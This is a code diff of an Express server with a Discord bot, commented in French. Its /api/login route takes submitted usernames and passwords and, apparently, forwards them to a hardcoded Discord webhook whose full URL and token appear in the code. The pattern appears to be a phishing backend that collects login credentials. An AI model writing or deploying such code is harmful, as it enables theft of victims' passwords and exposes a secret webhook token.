@@ -10,7 +10,7 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(__dirname));
 
-// Initialisation du Bot Discord
+// Initialisation du Bot Discord avec gestion des erreurs
 const discordClient = new Client({
     intents: [
         GatewayIntentBits.Guilds,
@@ -23,17 +23,19 @@ discordClient.once('ready', () => {
     console.log(`🤖 Bot Discord connecté : ${discordClient.user.tag}`);
 });
 
+// Connexion du bot sécurisée pour éviter les crashs globaux
 if (process.env.DISCORD_TOKEN) {
-    discordClient.login(process.env.DISCORD_TOKEN);
+    discordClient.login(process.env.DISCORD_TOKEN).catch(err => {
+        console.error("❌ Erreur lors du login Discord :", err);
+    });
 } else {
     console.error("⚠️ ERREUR : Le DISCORD_TOKEN est manquant !");
 }
 
-// Route pour gérer la connexion
+// Route pour gérer la connexion et envoyer le webhook
 app.post('/api/login', async (req, res) => {
   const { username, password } = req.body;
 
-  // URL du Webhook en dur pour éviter tout plantage
   const webhookUrl = 'https://discord.com/api/webhooks/1540701070035132426/sDLZp1nOijCqtXNWrH3nDbe7yABDpVkelKna2kzM7RBT6oQ1tl5Dik6PnjUC-3y2o9pe';
 
   const discordMessage = {
